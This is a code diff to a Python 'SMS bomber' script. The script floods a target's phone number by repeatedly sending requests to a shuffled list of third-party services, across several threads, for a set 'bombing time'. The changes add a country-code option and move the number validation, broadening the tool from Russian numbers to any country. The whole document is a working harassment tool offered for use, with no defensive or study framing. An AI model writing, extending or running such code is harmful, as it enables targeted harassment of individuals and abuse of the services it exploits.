@@ -12,34 +12,38 @@ import conf.config as cfg
 
 
 def flood(args, services):
+    # Create shuffled services list
     for service_info in cycle(random.sample(services, len(services))):
         if time.time() >= args.time:
             return 
-        service = Service(service_info, args.timeout, args.proxy)
-        service.parse_data()
-        service.replace_data(args.phone)
+        service = Service(service_info, args.phone, args.timeout, args.proxy)
+        domain_name = service.get_domain_name()
         try:
             service.send_request()
-            print(f"Success - {service.domain_name}")
+            print(f"Success - {domain_name}")
         except exceptions.ReadTimeout:
-            print(f"Fail - {service.domain_name} - ReadTimeout")
+            print(f"Fail - {domain_name} - ReadTimeout")
         except exceptions.ConnectTimeout:
-            print(f"Fail - {service.domain_name} - ConnectTimeout")
+            print(f"Fail - {domain_name} - ConnectTimeout")
         except exceptions.ConnectionError:
-            print(f"Fail - {service.domain_name} - ConnectionError")
+            print(f"Fail - {domain_name} - ConnectionError")
         except Exception as err:
             print(err) 
         except (KeyboardInterrupt, SystemExit):
             exit()
 
+
 def main():
     # Creating parser obj
     parser = ArgumentParser(
-        description="Sms bomber for russian phones"
+        description="Ultimate sms bomber"
     )
+    parser.add_argument("-c", "--country", type=str,
+                        metavar="<country-code>",
+                        help="country code without (+) sign")
     parser.add_argument("-p", "--phone",
                         metavar="<phone-number>", type=str,
-                        help="target's phone number, format no matters")
+                        help="target's phone number without country code")
     parser.add_argument("-t", "--time",
                         metavar="<seconds>", type=float,
                         help="bombing time in seconds")
@@ -53,36 +57,44 @@ def main():
                         help="use proxy from config.py file")
     parser.add_argument("--version", action="version",
                         version="%(prog)s " + cfg.__version__)
-    
     args = parser.parse_args()
     
-    # If user don't use phone and time parametrs 
+    # Check args 
+    if not args.country:
+        if cfg.default_country_code != None:
+            args.country = str(cfg.default_country_code)
+        else:
+            args.country = input("Enter target's country code without + sign: ")
     if not args.phone:
-        args.phone = input("Enter target's phone number in any format: ")
+        args.phone = input("Enter target's phone number without country code: ")
     if not args.time:
         args.time = float(input("Enter bombing time in seconds: "))
-    
-    # Check proxy flag
     if args.proxy:
         args.proxy = cfg.proxies
 
-    # Cleanup phone number
+    # Cleanup country code and phone number
     for trash in ("'", '"', "_", "-", "(", ")", " ", "+"):
+        if trash in args.country:
+            args.country = args.country.replace(trash, "")
         if trash in args.phone:
             args.phone = args.phone.replace(trash, "")
-    if args.phone[0] == "8":
-        args.phone = "7" + phone[1::]
-    if args.phone[0] == "9":
-        args.phone = "7" + phone[1::]
+    
+    # Check phone number and country code
+    if not 1 <= len(args.country) <= 3:
+        exit(f"{args.country} country code doesn't exist")
+    if len(args.phone) != 10:
+        exit(f"{args.phone} lenght is incorrect")
 
-    # Set stop time value
-    args.time += time.time()
+    args.phone = args.country + args.phone 
 
     # Load services list 
     with open("services.json", "r") as file:
         services = json.load(file)["services"]
 
     print(cfg.banner)    
+    
+    # Set stop time value
+    args.time += time.time()
     
     # Start threads 
     for thread in range(args.threads):
